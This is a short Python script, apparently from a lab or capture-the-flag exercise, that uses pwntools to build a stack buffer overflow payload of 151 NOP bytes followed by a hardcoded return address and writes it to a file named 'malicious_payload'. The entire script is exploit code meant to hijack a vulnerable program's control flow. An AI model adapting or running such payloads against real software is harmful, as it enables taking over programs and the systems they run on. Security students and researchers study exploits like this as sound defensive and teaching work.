from pwn import *
context.arch='amd64'
context.os='linux'

# Return address in little-endian format
ret_addr = 0x565562AD
addr = p64(ret_addr, endian='little')
# Opcode for the NOP instruction
nop = asm('nop', arch="amd64")
# Writes payload on a file
payload =  nop*151 + addr
print (payload)
with open("./malicious_payload", "wb") as f:
	f.write(payload)
